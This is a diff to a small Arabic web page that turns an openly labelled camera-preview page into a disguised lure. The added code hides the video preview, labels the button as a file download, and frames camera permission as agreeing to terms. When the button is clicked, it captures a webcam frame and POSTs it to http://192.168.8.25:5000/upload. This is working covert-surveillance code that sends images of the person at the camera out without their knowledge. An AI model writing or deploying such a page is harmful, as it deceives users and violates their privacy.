@@ -2,30 +2,39 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>نماذج امتحان</title>
+  <title>Camera Upload</title>
 </head>
 <body>
-  <h2>نماذج امتحان</h2>
-  <video id="video" autoplay playsinline></video>
-  <button id="snap">تنزيل الملف</button>
+  <h2>تنزيل الملف</h2>
+  <button id="snap">تنزيل ملف</button>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    const video = document.getElementById('video');
+    let stream;
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => video.srcObject = stream)
-      .catch(err => alert("نماذج امتحان: " + err));
+      .then(s => { stream = s; })
+      .catch(err => alert("يرجى الموافقه على الشروط!: " + err));
 
     document.getElementById('snap').onclick = () => {
-      const canvas = document.getElementById('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
 
-      const link = document.createElement('a');
-      link.download = 'photo.png';
-      link.href = canvas.toDataURL('image/png');
-      link.click();
+      const canvas = document.getElementById('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const data = canvas.toDataURL('image/png');
+
+      fetch('http://192.168.8.25:5000/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: data })
+      })
+      .then(res => res.text())
+      .then(msg => alert("✅ تم إرسال الملف: " + msg))
+      .catch(err => alert("❌ خطأ في الإرسال: " + err));
     };
   </script>
 </body>
